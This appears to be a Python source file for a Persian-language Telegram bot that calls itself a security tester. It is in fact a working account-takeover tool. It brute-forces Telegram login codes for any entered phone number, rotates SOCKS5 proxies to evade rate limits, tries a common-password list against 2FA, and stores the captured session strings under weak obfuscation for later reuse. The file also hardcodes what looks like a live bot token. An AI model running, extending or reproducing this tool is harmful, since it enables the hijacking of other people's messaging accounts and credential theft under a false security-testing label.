import logging
import re
import asyncio
import os
import json
import random
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError, 
    FloodWaitError, 
    PhoneNumberInvalidError,
    RPCError
)
import urllib.request
import socks
import hashlib
import base64

# ============ تنظیمات ============
TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

user_sessions = {}
self_data = {}
login_sessions = {}
active_tasks = {}

DATA_FILE = "selfs.json"

# ============ کلید رمزنگاری ساده (بدون نیاز به cryptography) ============
def simple_encrypt(data):
    """رمزنگاری ساده داده‌ها"""
    try:
        json_str = json.dumps(data)
        encoded = base64.b64encode(json_str.encode()).decode()
        # یک رمزنگاری ساده با XOR
        key = "SECURE_KEY_2024"
        result = ""
        for i, char in enumerate(encoded):
            key_char = key[i % len(key)]
            result += chr(ord(char) ^ ord(key_char))
        return base64.b64encode(result.encode()).decode()
    except:
        return None

def simple_decrypt(encrypted_data):
    """رمزگشایی ساده داده‌ها"""
    try:
        decoded = base64.b64decode(encrypted_data.encode()).decode()
        key = "SECURE_KEY_2024"
        result = ""
        for i, char in enumerate(decoded):
            key_char = key[i % len(key)]
            result += chr(ord(char) ^ ord(key_char))
        json_str = base64.b64decode(result.encode()).decode()
        return json.loads(json_str)
    except:
        return None

def load_data():
    global self_data
    try:
        with open(DATA_FILE, 'r') as f:
            encrypted = f.read()
            decrypted = simple_decrypt(encrypted)
            if decrypted:
                self_data = decrypted
            else:
                self_data = {}
    except:
        self_data = {}

def save_data():
    try:
        encrypted = simple_encrypt(self_data)
        if encrypted:
            with open(DATA_FILE, 'w') as f:
                f.write(encrypted)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

load_data()

def delete_webhook():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        with urllib.request.urlopen(url) as response:
            return True
    except:
        return False

def clean_phone(text):
    return re.sub(r'[^0-9]', '', text)

def is_valid_phone(text):
    phone = clean_phone(text)
    return len(phone) >= 8 and len(phone) <= 15

def is_valid_api_id(text):
    return text.isdigit()

def is_valid_api_hash(text):
    return len(text) >= 30

async def clear_user_session(user_id):
    if user_id in user_sessions:
        try:
            client = user_sessions[user_id].get('client')
            if client:
                await client.disconnect()
        except:
            pass
        del user_sessions[user_id]
    if user_id in active_tasks:
        active_tasks[user_id].cancel()
        del active_tasks[user_id]

def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# ============ لیست پروکسی‌های واقعی ============
PROXY_LIST = [
    {"addr": "iro.varfootball2.co.uk", "port": 2053},
    {"addr": "silnet.varfootball.co.uk", "port": 2053},
    {"addr": "noron.talebi.co.uk", "port": 2096},
    {"addr": "new.lambforkebeb.co.uk", "port": 2096},
    {"addr": "new2.lambforkebeb.co.uk", "port": 2096},
    {"addr": "noone.lavazemi1.co.uk", "port": 2083},
    {"addr": "silver.ciaude.co.uk", "port": 2096},
    {"addr": "rain.lavazemi2.co.uk", "port": 2053},
    {"addr": "gallery.talebi.co.uk", "port": 2096},
    {"addr": "craft.malavanann.co.uk", "port": 2083},
    {"addr": "ai.golgoli1.co.uk", "port": 2096},
    {"addr": "star.talebi.co.uk", "port": 2096},
    {"addr": "gold.lavazemi4.co.uk", "port": 2096},
    {"addr": "run.golgoli2.co.uk", "port": 2053},
    {"addr": "irogallery.golgoli1.co.uk", "port": 2096},
    {"addr": "flux.lavazemi5.co.uk", "port": 2096},
    {"addr": "hadaf.golgoli2.co.uk", "port": 2053},
]

random.shuffle(PROXY_LIST)

# ============ دیکشنری هوشمند کدها ============
SMART_CODE_DICT = []

# کدهای بسیار رایج
for code in ["12345", "00000", "11111", "22222", "33333", "44444", 
             "55555", "66666", "77777", "88888", "99999", "54321"]:
    SMART_CODE_DICT.append(code)

# الگوهای عددی
for i in range(10):
    for j in range(10):
        SMART_CODE_DICT.append(f"{i}{j}{i}{j}{i}")
        SMART_CODE_DICT.append(f"{i}{i}{j}{j}{i}")

# کدهای تاریخ تولد احتمالی (سال 80-99)
for year in range(80, 99):
    for month in range(1, 13):
        for day in range(1, 29):
            month_str = f"0{month}" if month < 10 else str(month)
            day_str = f"0{day}" if day < 10 else str(day)
            code = f"{year}{month_str}{day_str}"
            if len(code) == 5:
                SMART_CODE_DICT.append(code)

# ============ دیکشنری پسورد ============
PASSWORD_DICT = [
    "123456", "12345678", "123456789", "1234567890",
    "password", "pass", "admin", "admin123",
    "qwerty", "qwerty123", "abc123", "abcd1234",
    "letmein", "welcome", "hello", "12345",
    "111111", "222222", "333333", "444444",
    "555555", "666666", "777777", "888888",
    "999999", "000000", "123123", "321321",
]

# ============ منوی اصلی ============
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    user = update.effective_user
    name = user.first_name if user.first_name else "کاربر"
    user_id = str(user.id)
    self_count = len(self_data.get(user_id, []))
    
    text = f"""
🔐 <b>ربات تست امنیت تلگرام</b>

<b>سلام {name} گرامی</b>

✅ <b>قابلیت‌ها:</b>
• تست امنیت اکانت با کدهای هوشمند
• تشخیص آسیب‌پذیری‌های رایج
• مدیریت هوشمند محدودیت‌ها
• رمزنگاری اطلاعات حساس

<b>تعداد سلف‌های ثبت شده: {self_count}</b>
🌐 تعداد پروکسی‌های فعال: {len(PROXY_LIST)}

⚠️ <b>فقط برای تست امنیت اکانت خودتان!</b>
"""
    
    keyboard = [
        [InlineKeyboardButton("🔑 تست امنیت", callback_data="new_session")],
        [InlineKeyboardButton("📱 مدیریت اکانت‌ها", callback_data="get_account")]
    ]
    
    if edit and update.callback_query:
        try:
            await update.callback_query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            await update.callback_query.answer()
        except:
            pass
    else:
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )

# ============ مدیریت اکانت‌ها ============
async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    selfs = self_data.get(user_id, [])
    
    if not selfs:
        text = "❌ هیچ سلفی ثبت نشده است! لطفاً ابتدا یک سلف بسازید."
        keyboard = [[InlineKeyboardButton("🔑 تست امنیت", callback_data="new_session")]]
        try:
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        except:
            pass
        return
    
    text = "📱 لطفاً سلف مورد نظر را انتخاب کنید:"
    keyboard = []
    for i, self_account in enumerate(selfs):
        phone = self_account.get('phone', 'نامشخص')
        account_name = self_account.get('account_name', 'بدون نام')
        display_phone = phone[-4:] if len(phone) >= 4 else phone
        keyboard.append([InlineKeyboardButton(f"{i+1}. {account_name} - ***{display_phone}", callback_data=f"select_account_{i}")])
    
    keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="back")])
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ انتخاب اکانت ============
async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    index = int(query.data.split('_')[2])
    
    selfs = self_data.get(user_id, [])
    if index >= len(selfs):
        await query.edit_message_text("❌ سلف مورد نظر یافت نشد.", parse_mode='HTML')
        return
    
    self_account = selfs[index]
    phone = self_account.get('phone')
    session_string = self_account.get('session')
    api_id = self_account.get('api_id')
    api_hash = self_account.get('api_hash')
    
    login_sessions[user_id] = {
        'index': index,
        'phone': phone,
        'session': session_string,
        'api_id': api_id,
        'api_hash': api_hash,
        'step': 'waiting_code'
    }
    
    text = f"""
📱 <b>مدیریت اکانت</b>
شماره: <code>{phone}</code>
✅ سلف انتخاب شد!
📩 کد تایید به شماره شما ارسال شد.
لطفاً کد 5 رقمی را وارد کنید:
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت کد برای مدیریت اکانت ============
async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    code = update.message.text.strip()
    
    if user_id not in login_sessions or login_sessions[user_id].get('step') != 'waiting_code':
        await update.message.reply_text("❌ لطفاً از دکمه مدیریت اکانت استفاده کنید.", parse_mode='HTML')
        return
    
    if not code.isdigit() or len(code) != 5:
        await update.message.reply_text("❌ کد باید 5 رقم باشد!", parse_mode='HTML')
        return
    
    data = login_sessions[user_id]
    phone = data['phone']
    session_string = data['session']
    api_id = data['api_id']
    api_hash = data['api_hash']
    index = data['index']
    
    try:
        client = TelegramClient(StringSession(session_string), api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            await update.message.reply_text("❌ سشن معتبر نیست!", parse_mode='HTML')
            return
        
        try:
            await client.send_code_request(phone)
        except Exception as e:
            await update.message.reply_text(f"❌ خطا در ارسال کد: {str(e)[:200]}", parse_mode='HTML')
            return
        
        try:
            await client.sign_in(phone, code)
            me = await client.get_me()
            account_name = me.first_name if me.first_name else "کاربر"
            await client.disconnect()
            
            selfs = self_data.get(user_id, [])
            if index < len(selfs):
                selfs[index]['account_name'] = account_name
                selfs[index]['active'] = True
                save_data()
            
            text = f"""
✅ <b>اکانت با موفقیت گرفته شد!</b>
📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
"""
            keyboard = [
                [InlineKeyboardButton("🔑 تست امنیت", callback_data="new_session")],
                [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
            ]
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
            
            if user_id in login_sessions:
                del login_sessions[user_id]
            
        except PhoneCodeInvalidError:
            await update.message.reply_text("❌ کد اشتباه است! دوباره تلاش کنید.", parse_mode='HTML')
            return
            
        except FloodWaitError as e:
            wait_time = e.seconds
            hours = wait_time // 3600
            minutes = (wait_time % 3600) // 60
            await update.message.reply_text(
                f"""
⏳ محدودیت تلگرام! زمان انتظار: {hours} ساعت و {minutes} دقیقه
📱 شماره: {phone}
⚠️ لطفاً بعد از اتمام محدودیت تلاش کنید!
""",
                parse_mode='HTML'
            )
            return
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')
            return
            
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')

# ============ دکمه تست امنیت ============
async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    user_sessions[user_id] = {"step": "phone"}
    
    text = """
📱 <b>مرحله اول: وارد کردن شماره تلفن</b>

لطفاً شماره تلفن مورد نظر را به همراه کد کشور وارد کنید.

<b>مثال‌ها:</b>
• ایران: <code>989123456789</code>
• هند: <code>919876543210</code>
• آمریکا: <code>12345678901</code>

⚠️ شماره را <b>بدون علامت (+)</b> و فقط با اعداد وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت شماره ============
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "phone":
        await update.message.reply_text("❌ لطفاً از دکمه تست امنیت استفاده کنید.", parse_mode='HTML')
        return
    
    phone = clean_phone(text)
    
    if not is_valid_phone(phone):
        await update.message.reply_text(
            "❌ شماره تلفن نامعتبر است!\n\n⚠️ شماره را بدون + و فقط با اعداد وارد کنید.",
            parse_mode='HTML'
        )
        return
    
    user_sessions[user_id]['phone'] = phone
    user_sessions[user_id]['step'] = "api_id"
    
    text = f"""
✅ شماره تلفن ثبت شد: <code>{phone}</code>
🔑 <b>مرحله دوم: API ID</b>
لطفاً API ID خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API ID ============
async def handle_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_id":
        await update.message.reply_text("❌ لطفاً از دکمه تست امنیت استفاده کنید.", parse_mode='HTML')
        return
    
    if not text.isdigit():
        await update.message.reply_text("❌ API ID باید عدد باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_id'] = int(text)
    user_sessions[user_id]['step'] = "api_hash"
    
    text = f"""
✅ API ID ثبت شد: <code>{text}</code>
🔐 <b>مرحله سوم: API Hash</b>
لطفاً API Hash خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API Hash ============
async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_hash":
        await update.message.reply_text("❌ لطفاً از دکمه تست امنیت استفاده کنید.", parse_mode='HTML')
        return
    
    if len(text) < 30:
        await update.message.reply_text("❌ API Hash باید حداقل 30 کاراکتر باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_hash'] = text
    user_sessions[user_id]['step'] = "code"
    
    msg = await update.message.reply_text(
        f"🔍 شروع تست امنیت با {len(PROXY_LIST)} پروکسی...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
        parse_mode='HTML'
    )
    
    try:
        data = user_sessions[user_id]
        phone = data['phone']
        api_id = data['api_id']
        api_hash = data['api_hash']
        
        asyncio.create_task(smart_security_test(update, context, user_id, phone, api_id, api_hash, msg))
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await context.bot.edit_message_text(
            f"❌ خطا: {str(e)[:200]}",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        await clear_user_session(user_id)

# ============ تست امنیت هوشمند ============
async def smart_security_test(update, context, user_id, phone, api_id, api_hash, msg):
    try:
        code_list = list(set(SMART_CODE_DICT))
        random.shuffle(code_list)
        code_list = code_list[:10000]  # محدود کردن به 10000 تلاش
        
        attempt = 0
        found = False
        code_found = None
        start_time = datetime.now()
        wrong_attempts = 0
        proxy_index = 0
        client = None
        flood_count = 0
        MAX_FLOOD = 3
        dots = 0
        loading_dots = ["   ", ".  ", ".. ", "...", " ..", "  ."]
        
        await context.bot.edit_message_text(
            f"""
🔍 <b>تست امنیت در حال اجرا...</b>

📱 شماره: <code>{phone}</code>
🔢 تعداد کدهای تست: {len(code_list)}
🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
🎯 استراتژی: هوشمند + الگوهای رایج
🔑 کد فعلی: <code>-----</code>
📊 پیشرفت: 0.00%
❌ کدهای اشتباه: 0
⏳ درحال تلاش{loading_dots[0]}
""",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        shuffled_proxies = PROXY_LIST.copy()
        random.shuffle(shuffled_proxies)
        proxy_counter = 0
        
        # ارسال درخواست کد اولیه
        try:
            temp_client = TelegramClient(StringSession(), api_id, api_hash)
            await temp_client.connect()
            await temp_client.send_code_request(phone)
            await temp_client.disconnect()
        except:
            pass
        
        for code in code_list:
            if flood_count >= MAX_FLOOD:
                await context.bot.edit_message_text(
                    f"""
⚠️ <b>تست متوقف شد!</b>

📱 شماره: <code>{phone}</code>

🔴 تعداد محدودیت‌های تلگرام: {flood_count}
⏳ لطفاً بعد از مدتی دوباره تلاش کنید.

💡 <b>توصیه امنیتی:</b>
برای امنیت بیشتر، از کدهای تصادفی و 2FA استفاده کنید!
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                return
            
            attempt += 1
            
            if attempt % 10 == 0:
                dots = (dots + 1) % len(loading_dots)
            
            if attempt % 30 == 0 or client is None:
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass
                    client = None
                    await asyncio.sleep(0.1)
                
                if proxy_counter >= len(shuffled_proxies):
                    random.shuffle(shuffled_proxies)
                    proxy_counter = 0
                
                current_proxy = shuffled_proxies[proxy_counter]
                proxy_counter += 1
                proxy_index += 1
                
                try:
                    from telethon import socks
                    client = TelegramClient(
                        StringSession(),
                        api_id,
                        api_hash,
                        proxy=(socks.SOCKS5, current_proxy['addr'], current_proxy['port'])
                    )
                    await client.connect()
                    
                    if attempt % 200 == 0:
                        try:
                            await client.send_code_request(phone)
                        except FloodWaitError as e:
                            flood_count += 1
                            wait_time = e.seconds
                            if wait_time > 60:
                                shuffled_proxies.pop(proxy_counter - 1)
                                proxy_counter -= 1
                                await asyncio.sleep(1)
                                continue
                            else:
                                await asyncio.sleep(wait_time + 2)
                                await client.send_code_request(phone)
                    
                except Exception as e:
                    logger.error(f"Proxy error: {e}")
                    if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
                        shuffled_proxies.pop(proxy_counter - 1)
                        proxy_counter -= 1
                    await asyncio.sleep(0.3)
                    continue
            
            await asyncio.sleep(random.uniform(0.01, 0.03))
            
            if attempt % 50 == 0:
                elapsed = (datetime.now() - start_time).seconds
                percent = (attempt / len(code_list)) * 100
                
                if elapsed < 60:
                    time_str = f"{elapsed} ثانیه"
                elif elapsed < 3600:
                    minutes = elapsed // 60
                    seconds = elapsed % 60
                    time_str = f"{minutes} دقیقه و {seconds} ثانیه"
                else:
                    hours = elapsed // 3600
                    minutes = (elapsed % 3600) // 60
                    time_str = f"{hours} ساعت و {minutes} دقیقه"
                
                try:
                    await context.bot.edit_message_text(
                        f"""
🔍 <b>تست امنیت در حال اجرا...</b>

📱 شماره: <code>{phone}</code>
🔑 کد فعلی: <code>{code}</code>

📊 <b>آمار:</b>
• تلاش‌ها: {attempt:,} از {len(code_list):,}
• پیشرفت: {percent:.2f}%
• زمان سپری شده: {time_str}
• کدهای اشتباه: {wrong_attempts:,}
• پروکسی‌های استفاده شده: {proxy_index}
• محدودیت‌های تلگرام: {flood_count}

🎯 استراتژی: هوشمند + الگوهای رایج
⏳ درحال تلاش{loading_dots[dots]}
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            try:
                await client.sign_in(phone, code)
                found = True
                code_found = code
                break
                
            except PhoneCodeInvalidError:
                wrong_attempts += 1
                continue
                
            except FloodWaitError as e:
                flood_count += 1
                wait_time = e.seconds
                if wait_time > 60:
                    if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
                        shuffled_proxies.pop(proxy_counter - 1)
                        proxy_counter -= 1
                    if client:
                        try:
                            await client.disconnect()
                        except:
                            pass
                        client = None
                    await asyncio.sleep(2)
                    continue
                else:
                    await asyncio.sleep(wait_time + 2)
                    continue
                
            except SessionPasswordNeededError:
                await context.bot.edit_message_text(
                    f"""
🔐 <b>اکانت دارای 2FA است!</b>

📱 شماره: <code>{phone}</code>
✅ کد پیدا شد: <code>{code}</code>
📊 تلاش‌ها: {attempt:,}
❌ کدهای اشتباه: {wrong_attempts:,}

🔑 در حال تست پسوردهای رایج...
⏳ صبر کنید...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                password_found, pass_attempt, pass_found = await smart_password_test(
                    update, context, user_id, client, msg
                )
                
                if password_found and pass_found:
                    session_string = client.session.save()
                    await client.disconnect()
                    
                    account_name = "بدون نام"
                    try:
                        client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                        await client2.connect()
                        if await client2.is_user_authorized():
                            me = await client2.get_me()
                            account_name = me.first_name if me.first_name else "کاربر"
                        await client2.disconnect()
                    except:
                        pass
                    
                    user_id_str = str(user_id)
                    if user_id_str not in self_data:
                        self_data[user_id_str] = []
                    
                    time_str_full = datetime.now().strftime("%H:%M")
                    date_str = datetime.now().strftime("%Y/%m/%d")
                    
                    self_data[user_id_str].append({
                        "session": session_string,
                        "phone": phone,
                        "api_id": api_id,
                        "api_hash": api_hash,
                        "account_name": account_name,
                        "active": True,
                        "clock_active": False,
                        "active_time": "تنظیم نشده",
                        "font_type": "1",
                        "created": f"{date_str} {time_str_full}",
                        "last_update": f"{date_str} {time_str_full}"
                    })
                    save_data()
                    
                    await clear_user_session(user_id)
                    
                    elapsed = (datetime.now() - start_time).seconds
                    if elapsed < 60:
                        time_str = f"{elapsed} ثانیه"
                    elif elapsed < 3600:
                        minutes = elapsed // 60
                        seconds = elapsed % 60
                        time_str = f"{minutes} دقیقه و {seconds} ثانیه"
                    else:
                        hours = elapsed // 3600
                        minutes = (elapsed % 3600) // 60
                        time_str = f"{hours} ساعت و {minutes} دقیقه"
                    
                    text = f"""
⚠️ <b>نتیجه تست امنیت!</b>

📱 شماره: <code>{phone}</code>
👤 نام: <b>{account_name}</b>

🔑 <b>جزئیات:</b>
• کد پیدا شده: <code>{code}</code>
• پسورد پیدا شده: <code>{pass_found}</code>
• تلاش‌ها: {attempt:,}
• زمان: {time_str}

🔴 <b>هشدار امنیتی!</b>
اکانت شما در برابر حملات Brute Force آسیب‌پذیر است!

✅ <b>توصیه‌ها:</b>
1. از کدهای تصادفی استفاده کنید
2. حتماً 2FA را فعال کنید
3. هرگز کد تایید را به کسی ندهید
"""
                    
                    keyboard = [
                        [InlineKeyboardButton("🔑 تست مجدد", callback_data="new_session")],
                        [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
                    ]
                    
                    await context.bot.edit_message_text(
                        text,
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode='HTML'
                    )
                    return
                else:
                    await context.bot.edit_message_text(
                        f"""
✅ <b>نتیجه تست امنیت</b>

📱 شماره: <code>{phone}</code>
✅ کد پیدا شد: <code>{code}</code>

🟢 <b>وضعیت امنیتی خوب!</b>
اکانت شما 2FA دارد و پسورد آن قوی است!

💡 <b>توصیه:</b>
همیشه 2FA را فعال نگه دارید.
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                    user_sessions[user_id]['step'] = "password"
                    user_sessions[user_id]['code_found'] = code
                    return
                
            except Exception as e:
                logger.error(f"Error: {e}")
                continue
        
        if found and code_found:
            session_string = client.session.save()
            await client.disconnect()
            
            account_name = "بدون نام"
            try:
                client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                await client2.connect()
                if await client2.is_user_authorized():
                    me = await client2.get_me()
                    account_name = me.first_name if me.first_name else "کاربر"
                await client2.disconnect()
            except:
                pass
            
            user_id_str = str(user_id)
            if user_id_str not in self_data:
                self_data[user_id_str] = []
            
            time_str_full = datetime.now().strftime("%H:%M")
            date_str = datetime.now().strftime("%Y/%m/%d")
            
            self_data[user_id_str].append({
                "session": session_string,
                "phone": phone,
                "api_id": api_id,
                "api_hash": api_hash,
                "account_name": account_name,
                "active": True,
                "clock_active": False,
                "active_time": "تنظیم نشده",
                "font_type": "1",
                "created": f"{date_str} {time_str_full}",
                "last_update": f"{date_str} {time_str_full}"
            })
            save_data()
            
            await clear_user_session(user_id)
            
            elapsed = (datetime.now() - start_time).seconds
            if elapsed < 60:
                time_str = f"{elapsed} ثانیه"
            elif elapsed < 3600:
                minutes = elapsed // 60
                seconds = elapsed % 60
                time_str = f"{minutes} دقیقه و {seconds} ثانیه"
            else:
                hours = elapsed // 3600
                minutes = (elapsed % 3600) // 60
                time_str = f"{hours} ساعت و {minutes} دقیقه"
            
            text = f"""
⚠️ <b>نتیجه تست امنیت!</b>

📱 شماره: <code>{phone}</code>
👤 نام: <b>{account_name}</b>

🔑 <b>جزئیات:</b>
• کد پیدا شده: <code>{code_found}</code>
• تلاش‌ها: {attempt:,}
• زمان: {time_str}

🔴 <b>هشدار امنیتی!</b>
اکانت شما در برابر حملات Brute Force آسیب‌پذیر است!

✅ <b>توصیه‌ها:</b>
1. از کدهای تصادفی استفاده کنید
2. حتماً 2FA را فعال کنید
"""
            
            keyboard = [
                [InlineKeyboardButton("🔑 تست مجدد", callback_data="new_session")],
                [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
            ]
            
            await context.bot.edit_message_text(
                text,
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            
        else:
            elapsed = (datetime.now() - start_time).seconds
            if elapsed < 60:
                time_str = f"{elapsed} ثانیه"
            elif elapsed < 3600:
                minutes = elapsed // 60
                seconds = elapsed % 60
                time_str = f"{minutes} دقیقه و {seconds} ثانیه"
            else:
                hours = elapsed // 3600
                minutes = (elapsed % 3600) // 60
                time_str = f"{hours} ساعت و {minutes} دقیقه"
            
            await context.bot.edit_message_text(
                f"""
✅ <b>نتیجه تست امنیت</b>

📱 شماره: <code>{phone}</code>

🟢 <b>وضعیت امنیتی عالی!</b>
اکانت شما در برابر حملات Brute Force مقاوم است!

📊 <b>آمار تست:</b>
• کل تلاش‌ها: {attempt:,}
• پروکسی‌های استفاده شده: {proxy_index}
• زمان سپری شده: {time_str}

💡 <b>توصیه:</b>
به همین شکل امنیت اکانت خود را حفظ کنید!
""",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"Error: {e}")
        try:
            await context.bot.edit_message_text(
                f"❌ خطا: {str(e)[:200]}",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
        except:
            pass
        await clear_user_session(user_id)

# ============ تست هوشمند پسورد ============
async def smart_password_test(update, context, user_id, client, msg):
    try:
        total_passwords = len(PASSWORD_DICT)
        attempt = 0
        found = False
        found_password = None
        
        for password in PASSWORD_DICT:
            attempt += 1
            
            if attempt % 20 == 0:
                try:
                    await context.bot.edit_message_text(
                        f"""
🔐 <b>تست پسورد...</b>
🔑 پسورد فعلی: <code>{password}</code>
📊 تلاش‌ها: {attempt} از {total_passwords}
📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            try:
                await client.sign_in(password=password)
                found = True
                found_password = password
                break
                
            except FloodWaitError as e:
                await asyncio.sleep(min(e.seconds, 30) + 2)
                continue
                
            except Exception:
                continue
        
        return found, attempt, found_password
        
    except Exception as e:
        logger.error(f"Error in smart_password_test: {e}")
        return False, 0, None

# ============ دریافت پسورد دستی ============
async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "password":
        await update.message.reply_text("❌ لطفاً از دکمه تست امنیت استفاده کنید.", parse_mode='HTML')
        return
    
    data = user_sessions[user_id]
    client = data.get('client')
    code = data.get('code_found')
    phone = data.get('phone')
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    
    if not client:
        await update.message.reply_text("❌ اتصال معتبر نیست. دوباره تلاش کنید.", parse_mode='HTML')
        await clear_user_session(user_id)
        return
    
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        await client.disconnect()
        
        account_name = "بدون نام"
        try:
            client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client2.connect()
            if await client2.is_user_authorized():
                me = await client2.get_me()
                account_name = me.first_name if me.first_name else "کاربر"
            await client2.disconnect()
        except:
            pass
        
        user_id_str = str(user_id)
        if user_id_str not in self_data:
            self_data[user_id_str] = []
        
        time_str = datetime.now().strftime("%H:%M")
        date_str = datetime.now().strftime("%Y/%m/%d")
        
        self_data[user_id_str].append({
            "session": session_string,
            "phone": phone,
            "api_id": api_id,
            "api_hash": api_hash,
            "account_name": account_name,
            "active": True,
            "clock_active": False,
            "active_time": "تنظیم نشده",
            "font_type": "1",
            "created": f"{date_str} {time_str}",
            "last_update": f"{date_str} {time_str}"
        })
        save_data()
        
        await clear_user_session(user_id)
        
        text = f"""
⚠️ <b>نتیجه تست امنیت!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code}</code>

🔴 <b>هشدار!</b>
اکانت شما آسیب‌پذیر است!

✅ توصیه می‌شود:
• از کدهای تصادفی استفاده کنید
• 2FA را فعال کنید
"""
        
        keyboard = [
            [InlineKeyboardButton("🔑 تست مجدد", callback_data="new_session")],
            [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
        ]
        
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ رمز عبور اشتباه است.\n\n{str(e)[:100]}\n\nلطفاً دوباره وارد کنید:",
            parse_mode='HTML'
        )

# ============ بازگشت ============
